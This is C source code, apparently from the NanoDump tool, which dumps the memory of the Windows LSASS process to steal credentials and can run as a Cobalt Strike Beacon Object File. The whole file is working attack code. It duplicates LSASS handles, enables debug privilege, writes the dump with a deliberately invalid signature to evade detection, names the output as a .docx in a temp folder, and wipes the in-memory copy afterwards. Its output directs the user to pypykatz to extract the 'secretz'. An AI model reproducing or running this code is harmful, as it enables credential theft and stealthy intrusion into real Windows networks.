
BOOL is_important_module(
    PVOID address,
    struct module_info* module_list
)
{
    struct module_info* curr_module = module_list;
    while (curr_module)
    {
        if ((ULONG_PTR)address >= (ULONG_PTR)curr_module->dll_base &&
            (ULONG_PTR)address < (ULONG_PTR)curr_module->dll_base + curr_module->size_of_image)
            return TRUE;
        curr_module = curr_module->next;
    }
    return FALSE;
}

struct MiniDumpMemoryDescriptor64* get_memory_ranges(
    struct dump_context* dc,
    struct module_info* module_list
)
{
    struct MiniDumpMemoryDescriptor64 *ranges_list = NULL;
    PVOID base_address, current_address;
    ULONG64 region_size;
    current_address = 0;
    MEMORY_INFORMATION_CLASS mic = 0;
    MEMORY_BASIC_INFORMATION mbi;

    while (TRUE)
    {
        NTSTATUS status = NtQueryVirtualMemory(
            dc->hProcess,
            (PVOID)current_address,
            mic,
            &mbi,
            sizeof(mbi),
            NULL
        );
        if (!NT_SUCCESS(status))
            break;

        base_address = mbi.BaseAddress;
        region_size = mbi.RegionSize;
        // next memory range
        current_address = base_address + region_size;

        // ignore non-commited pages
        if (mbi.State != MEM_COMMIT)
            continue;
        // ignore pages with PAGE_NOACCESS
        if ((mbi.Protect & PAGE_NOACCESS) == PAGE_NOACCESS)
            continue;
        // ignore mapped pages
        if (mbi.Type == MEM_MAPPED)
            continue;
        // ignore pages with PAGE_GUARD as they can't be read
        if ((mbi.Protect & PAGE_GUARD) == PAGE_GUARD)
            continue;
        // ignore modules that are not relevant to mimikatz
        if (mbi.Type == MEM_IMAGE &&
            !is_important_module(
                base_address,
                module_list))
            continue;

        struct MiniDumpMemoryDescriptor64 *new_range = (struct MiniDumpMemoryDescriptor64*)intAlloc(sizeof(struct MiniDumpMemoryDescriptor64));
        if(!new_range)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
                (ULONG32)sizeof(struct MiniDumpMemoryDescriptor64),
                KERNEL32$GetLastError());
            return NULL;
        }
        new_range->next = NULL;
        new_range->StartOfMemoryRange = (ULONG_PTR)base_address;
        new_range->DataSize = region_size;

        if (!ranges_list)
        {
            ranges_list = new_range;
        }
        else
        {
            struct MiniDumpMemoryDescriptor64* last_range = ranges_list;
            while (last_range->next)
                last_range = last_range->next;
            last_range->next = new_range;
        }
    }
    return ranges_list;
}

struct MiniDumpMemoryDescriptor64* write_memory64_list_stream(
    struct dump_context* dc,
    struct module_info* module_list
)
{
    ULONG32 stream_rva = dc->rva;

    struct MiniDumpMemoryDescriptor64* memory_ranges = get_memory_ranges(
        dc,
        module_list
    );
    if (!memory_ranges)
        return FALSE;

    // write the number of ranges
    ULONG64 number_of_ranges = 1;
    struct MiniDumpMemoryDescriptor64* curr_range = memory_ranges;
    while(curr_range->next && number_of_ranges++)
        curr_range = curr_range->next;
    append(dc, &number_of_ranges, 8);

    // write the rva of the actual memory content
    ULONG32 stream_size = 16 + 16 * number_of_ranges;
    ULONG64 base_rva = stream_rva + stream_size;
    append(dc, &base_rva, 8);

    // write the start and size of each memory range
    curr_range = memory_ranges;
    while (curr_range)
    {
        append(dc, &curr_range->StartOfMemoryRange, 8);
        append(dc, &curr_range->DataSize, 8);
        curr_range = curr_range->next;
    }

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 * 2 + 4, &stream_size, 4); // header + 2 directories + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 12 * 2 + 4 + 4, &stream_rva, 4); // header + 2 directories + streamType + Location.DataSize

    // dump all the selected memory ranges
    curr_range = memory_ranges;
    while (curr_range)
    {
        byte* buffer = (byte*)intAlloc(curr_range->DataSize);
        if (!buffer)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call HeapAlloc for 0x%llx bytes, error: %ld\n",
                curr_range->DataSize,
                KERNEL32$GetLastError()
            );
            return NULL;
        }
        NTSTATUS status = NtReadVirtualMemory(
            dc->hProcess,
            (PVOID)(ULONG_PTR)curr_range->StartOfMemoryRange,
            buffer,
            curr_range->DataSize,
            NULL
        );
        if (!NT_SUCCESS(status))
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtReadVirtualMemory, status: 0x%lx. Continuing anyways...\n",
                status
            );
            //return NULL;
        }
        append(dc, buffer, curr_range->DataSize);
        intFree(buffer); buffer = NULL;
        curr_range = curr_range->next;
    }

    return memory_ranges;
}

BOOL NanoDumpWriteDump(
    struct dump_context* dc
)
{
    write_header(dc);

    write_directories(dc);

    if (!write_system_info_stream(dc))
        return FALSE;

    struct module_info* module_list;
    module_list = write_module_list_stream(dc);
    if (!module_list)
        return FALSE;

    struct MiniDumpMemoryDescriptor64* memory_ranges;
    memory_ranges = write_memory64_list_stream(dc, module_list);
    if (!memory_ranges)
        return FALSE;

    free_linked_list(module_list); module_list = NULL;

    free_linked_list(memory_ranges); memory_ranges = NULL;

    return TRUE;
}

BOOL is_lsass(HANDLE hProcess)
{
    // if the process has 'lsass.exe' loaded, then we found LSASS
    wchar_t* module_name[] = { L"lsass.exe" };
    struct module_info* module_list = find_modules(
        hProcess,
        module_name,
        ARRAY_SIZE(module_name),
        FALSE
    );
    if (module_list)
    {
        free_linked_list(module_list); module_list = NULL;
        return TRUE;
    }
    return FALSE;
}

HANDLE find_lsass(void)
{
    // loop over each process
    HANDLE hProcess = NULL;
    while (TRUE)
    {
        NTSTATUS status = NtGetNextProcess(
            hProcess,
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            0,
            0,
            &hProcess
        );
        if (status == STATUS_NO_MORE_ENTRIES)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "The LSASS process was not found.\n"
            );
            return NULL;
        }
        if (!NT_SUCCESS(status))
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtGetNextProcess, status: 0x%lx\n",
                status
            );
            return NULL;
        }
        if (is_lsass(hProcess))
            return hProcess;
    }
}

PVOID allocate_memory(SIZE_T* RegionSize)
{
    PVOID BaseAddress = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        0,
        RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Could not allocate enough memory to write the dump\n"
        );
        return NULL;
    }
    return BaseAddress;
}

void erase_dump_from_memory(PVOID BaseAddress, SIZE_T RegionSize)
{
    // delete all trace of the dump from memory
    MSVCRT$memset(BaseAddress, 0, RegionSize);
    // free the memory area where the dump was
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
            status
        );
    }
}

void generate_invalid_sig(char* signature)
{
    time_t t;
    MSVCRT$srand((unsigned) MSVCRT$time(&t));
    signature[0] = 'P';
    signature[1] = 'M';
    signature[2] = 'D';
    signature[3] = 'M';
    while (!MSVCRT$strncmp(signature, "PMDM", 4))
    {
        signature[0] = MSVCRT$rand() & 0xFF;
        signature[1] = MSVCRT$rand() & 0xFF;
        signature[2] = MSVCRT$rand() & 0xFF;
        signature[3] = MSVCRT$rand() & 0xFF;
    }
}

BOOL is_process_handle(
    HANDLE handle
)
{
    BOOL is_process = FALSE;
    ULONG size = 0x1000;
    POBJECT_TYPE_INFORMATION ObjectInformation = (POBJECT_TYPE_INFORMATION)intAlloc(size);
    if (!ObjectInformation)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
            size,
            KERNEL32$GetLastError()
        );
        return FALSE;
    }

    NTSTATUS status = NtQueryObject(
        handle,
        ObjectTypeInformation,
        ObjectInformation,
        size,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtQueryObject, status: 0x%lx\n",
            status
        );
        return FALSE;
    }
    if (!MSVCRT$_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
        is_process = TRUE;
    intFree(ObjectInformation); ObjectInformation = NULL;
    return is_process;
}

PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
{
    NTSTATUS status;
    ULONG initial_size = 0x200000;
    ULONG buffer_size = initial_size;
    ULONG actual_buffer_size;
    ULONG increase_step = 0x10000;
    PVOID handleTableInformation = intAlloc(buffer_size);
    if (!handleTableInformation)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
            buffer_size,
            KERNEL32$GetLastError()
        );
        return NULL;
    }
    while (TRUE)
    {
        //get information of all the existing handles
        status = NtQuerySystemInformation(
            SystemHandleInformation,
            handleTableInformation,
            buffer_size,
            &actual_buffer_size
        );
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            // increase the size of the buffer to fit all the handles
            intFree(handleTableInformation); handleTableInformation = NULL;
            buffer_size += increase_step;
            if (buffer_size < initial_size)
            {
                // an integer overflow is extremely unlikely, but just in case...
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Cannot increase buffer_size any more\n"
                );
                return NULL;
            }
            handleTableInformation = intAlloc(buffer_size);
            if (!handleTableInformation)
            {
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
                    buffer_size,
                    KERNEL32$GetLastError()
                );
                return NULL;
            }
            continue;
        }
        if (!NT_SUCCESS(status))
        {
            intFree(handleTableInformation); handleTableInformation = NULL;
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtQuerySystemInformation, status: 0x%lx\n",
                status
            );
            return NULL;
        }
        return handleTableInformation;
    }
}

BOOL process_is_included(
    PPROCESS_LIST process_list,
    ULONG ProcessId
)
{
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        if (process_list->ProcessId[i] == ProcessId)
            return TRUE;
    }
    return FALSE;
}

PPROCESS_LIST get_processest_from_handle_table(
    PSYSTEM_HANDLE_INFORMATION handleTableInformation
)
{
    PPROCESS_LIST process_list = (PPROCESS_LIST)intAlloc(sizeof(PROCESS_LIST));
    if (!process_list)
    {
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(PROCESS_LIST),
            KERNEL32$GetLastError()
        );
        return NULL;
    }

    for (ULONG i = 0; i < handleTableInformation->Count; i++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];

        if (!process_is_included(process_list, handleInfo->ProcessId))
        {
            process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
            if (process_list->Count == MAX_PROCESSES)
            {
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Too many processes, please increase MAX_PROCESSES\n"
                );
                break;
            }
        }
    }
    return process_list;
}

HANDLE duplicate_lsass_handle(
    DWORD dwPid
)
{
    NTSTATUS status;

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
    if (!handleTableInformation)
        return NULL;

    PPROCESS_LIST process_list = get_processest_from_handle_table(handleTableInformation);
    if (!process_list)
        return NULL;

    for (ULONG i = 0; i < process_list->Count; i++)
    {
        ULONG ProcessId = process_list->ProcessId[i];

        if (ProcessId == dwPid)
            continue;
        if (ProcessId == 4)
            continue;

        // open a handle to the process with PROCESS_DUP_HANDLE
        HANDLE hProcess = get_process_handle(
            ProcessId,
            PROCESS_DUP_HANDLE,
            TRUE
        );
        if (!hProcess)
            continue;

        // this isn't super efficient but whatever
        for (ULONG j = 0; j < handleTableInformation->Count; j++)
        {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

            if (handleInfo->ProcessId != ProcessId)
                continue;

            // duplicate the handle
            HANDLE hDuped;
            status = NtDuplicateObject(
                hProcess,
                (HANDLE)(DWORD_PTR)handleInfo->Handle,
                NtCurrentProcess(),
                &hDuped,
                PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
                0,
                0
            );
            if (!NT_SUCCESS(status))
                continue;

            if (!is_process_handle(hDuped))
            {
                NtClose(hDuped); hDuped = NULL;
                continue;
            }

            if (is_lsass(hDuped))
            {
                // found LSASS handle
#ifdef BOF
                BeaconPrintf(CALLBACK_OUTPUT,
#else
                printf(
#endif
                    "Found LSASS handle: 0x%x, on process: %ld\n",
                    handleInfo->Handle,
                    handleInfo->ProcessId
                );
                intFree(handleTableInformation); handleTableInformation = NULL;
                intFree(process_list); process_list = NULL;
                NtClose(hProcess); hProcess = NULL;
                return hDuped;
            }
            NtClose(hDuped); hDuped = NULL;
        }
        NtClose(hProcess); hProcess = NULL;
    }

#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR,
#else
    printf(
#endif
        "No handle to the LSASS process was found\n"
    );

    intFree(handleTableInformation); handleTableInformation = NULL;
    intFree(process_list); process_list = NULL;
    return NULL;
}

void encrypt_dump(
    void* BaseAddress,
    ULONG32 Size
)
{
    // add your code here
    return;
}

#ifdef BOF
void go(char* args, int length)
{
    datap  parser;
    int    pid;
    char*  dump_name;
    BOOL   do_write;
    BOOL   fork;
    BOOL   dup;
    BOOL   use_valid_sig;
    BOOL   success;

    BeaconDataParse(&parser, args, length);
    pid = BeaconDataInt(&parser);
    dump_name = BeaconDataExtract(&parser, NULL);
    do_write = (BOOL)BeaconDataInt(&parser);
    use_valid_sig = (BOOL)BeaconDataInt(&parser);
    fork = (BOOL)BeaconDataInt(&parser);
    dup = (BOOL)BeaconDataInt(&parser);

#ifndef _WIN64
    if(IsWoW64())
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Nanodump does not support WoW64"
        );
        return;
    }
#endif

    if (do_write && !MSVCRT$strrchr(dump_name, '\\'))
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "You must provide a full path: %s",
            dump_name
        );
        return;
    }

    if (fork && dup)
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Cannot set both --fork and --dup"
        );
        return;
    }

    if (fork && !pid)
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Process forking requires a PID"
        );
        return;
    }

    if (dup && !pid)
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Handle duplication requires a PID"
        );
        return;
    }

    // set the signature
    char signature[4];
    if (use_valid_sig)
    {
        signature[0] = 'P';
        signature[1] = 'M';
        signature[2] = 'D';
        signature[3] = 'M';
    }
    else
    {
        generate_invalid_sig(signature);
    }

    success = enable_debug_priv();
    if (!success)
    {
        BeaconPrintf(
            CALLBACK_ERROR,
            "Could not enable 'SeDebugPrivilege', continuing anyways..."
        );
    }

    HANDLE hProcess;

    if (pid)
    {
        if (fork)
        {
            hProcess = fork_lsass_process(
                pid
            );
        }
        else if (dup)
        {
            hProcess = duplicate_lsass_handle(
                pid
            );
        }
        else
        {
            hProcess = get_process_handle(
                pid,
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                FALSE
            );
        }
    }
    else
        hProcess = find_lsass();
    if (!hProcess)
        return;

    // allocate a chuck of memory to write the dump
    SIZE_T RegionSize = DUMP_MAX_SIZE;
    PVOID BaseAddress = allocate_memory(&RegionSize);
    if (!BaseAddress)
    {
        NtClose(hProcess); hProcess = NULL;
        return;
    }

    struct dump_context dc;
    dc.hProcess = hProcess;
    dc.BaseAddress = BaseAddress;
    dc.rva = 0;
    dc.signature = signature;

    success = NanoDumpWriteDump(&dc);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(dc.BaseAddress, dc.rva);

    if (success)
    {
        if (do_write)
        {
            success = write_file(
                dump_name,
                dc.BaseAddress,
                dc.rva
            );
        }
        else
        {
            success = download_file(
                dump_name,
                dc.BaseAddress,
                dc.rva
            );
        }
    }

    erase_dump_from_memory(BaseAddress, RegionSize);

    // close the handle
    NtClose(hProcess); hProcess = NULL;

    if (success)
    {
        if (MSVCRT$strncmp(signature, "PMDM", 4))
        {
            BeaconPrintf(
                CALLBACK_OUTPUT,
                "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
                do_write? &MSVCRT$strrchr(dump_name, '\\')[1] : dump_name
            );
        }
        if (do_write)
        {
            BeaconPrintf(
                CALLBACK_OUTPUT,
                "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
                dump_name,
                &MSVCRT$strrchr(dump_name, '\\')[1]
            );
        }
        else
        {
            BeaconPrintf(
                CALLBACK_OUTPUT,
                "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
                dump_name
            );
        }
    }
}

#else

void usage(char* procname)
{
    printf("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--dup] [--pid 1234] [--help]\n", procname);
    printf("    --write PATH, -w PATH\n");
    printf("            full path to the dumpfile\n");
    printf("    --valid, -v\n");
    printf("            create a dump with a valid signature (optional)\n");
    printf("    --fork, -f\n");
    printf("            fork target process before dumping (optional)\n");
    printf("    --dup, -d\n");
    printf("            duplicate an existing LSASS handle (optional)\n");
    printf("    --pid PID, -p PID\n");
    printf("            the PID of LSASS (required if --fork or --dup are used)\n");
    printf("    --help, -h\n");
    printf("            print this help message and leave");
}

int main(int argc, char* argv[])
{
    int pid = 0;
    BOOL fork = FALSE;
    BOOL dup = FALSE;
    char* dump_name = NULL;
    char signature[4];
    BOOL success;

#ifndef _WIN64
    if(IsWoW64())
    {
        printf(
            "Nanodump does not support WoW64\n"
        );
        return 0;
    }
#endif

    // by default, set an invalid signature
    generate_invalid_sig(signature);

    for (int i = 1; i < argc; ++i)
    {
        if (!strncmp(argv[i], "-v", 3) ||
            !strncmp(argv[i], "--valid", 8))
        {
            signature[0] = 'P';
            signature[1] = 'M';
            signature[2] = 'D';
            signature[3] = 'M';
        }
        else if (!strncmp(argv[i], "-w", 3) ||
                 !strncmp(argv[i], "--write", 8))
        {
            dump_name = argv[++i];
        }
        else if (!strncmp(argv[i], "-p", 3) ||
                 !strncmp(argv[i], "--pid", 6))
        {
            pid = atoi(argv[++i]);
        }
        else if (!strncmp(argv[i], "-f", 3) ||
                 !strncmp(argv[i], "--fork", 7))
        {
            fork = TRUE;
        }
        else if (!strncmp(argv[i], "-d", 3) ||
                 !strncmp(argv[i], "--dup", 6))
        {
            dup = TRUE;
        }
        else if (!strncmp(argv[i], "-h", 3) ||
                 !strncmp(argv[i], "--help", 7))
        {
            usage(argv[0]);
            return 0;
        }
        else
        {
            printf("invalid argument: %s\n", argv[i]);
            return -1;
        }
    }

    if (!dump_name)
    {
        printf("You must provide the dump file: --write C:\\Windows\\Temp\\doc.docx\n\n");
        usage(argv[0]);
        return -1;
    }

    if (!strrchr(dump_name, '\\'))
    {
        printf("You must provide a full path: %s\n", dump_name);
        return -1;
    }

    if (dup && fork)
    {
        printf("Can't set both --dup and --fork\n");
        return -1;
    }

    if (fork && !pid)
    {
        printf("Process forking requires a PID\n");
        return -1;
    }

    if (dup && !pid)
    {
        printf("Handle duplication requires a PID\n");
        return -1;
    }

    success = enable_debug_priv();
    if (!success)
    {
        printf(
            "Could not enable 'SeDebugPrivilege', continuing anyways...\n"
        );
    }

    HANDLE hProcess;
    if (pid)
    {
        if (fork)
        {
            hProcess = fork_lsass_process(
                pid
            );
        }
        else if (dup)
        {
            hProcess = duplicate_lsass_handle(
                pid
            );
        }
        else
        {
            hProcess = get_process_handle(
                pid,
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                FALSE
            );
        }
    }
    else
        hProcess = find_lsass();
    if (!hProcess)
        return -1;

    // allocate a chuck of memory to write the dump
    SIZE_T RegionSize = DUMP_MAX_SIZE;
    PVOID BaseAddress = allocate_memory(&RegionSize);
    if (!BaseAddress)
    {
        NtClose(hProcess); hProcess = NULL;
        return -1;
    }

    struct dump_context dc;
    dc.hProcess = hProcess;
    dc.BaseAddress = BaseAddress;
    dc.rva = 0;
    dc.signature = signature;

    success = NanoDumpWriteDump(&dc);

    // at this point, you can encrypt or obfuscate the dump
    encrypt_dump(dc.BaseAddress, dc.rva);

    if (success)
    {
        success = write_file(
            dump_name,
            dc.BaseAddress,
            dc.rva
        );
    }

    erase_dump_from_memory(BaseAddress, RegionSize);

    // close the handle
    NtClose(hProcess); hProcess = NULL;

    if (success)
    {
        if (MSVCRT$strncmp(signature, "PMDM", 4))
        {
            printf(
                "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s\n",
                &strrchr(dump_name, '\\')[1]
            );
        }
        printf(
            "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s\n",
            &MSVCRT$strrchr(dump_name, '\\')[1]
        );
        return 0;
    }
    else
    {
        return -1;
    }
}

#endif
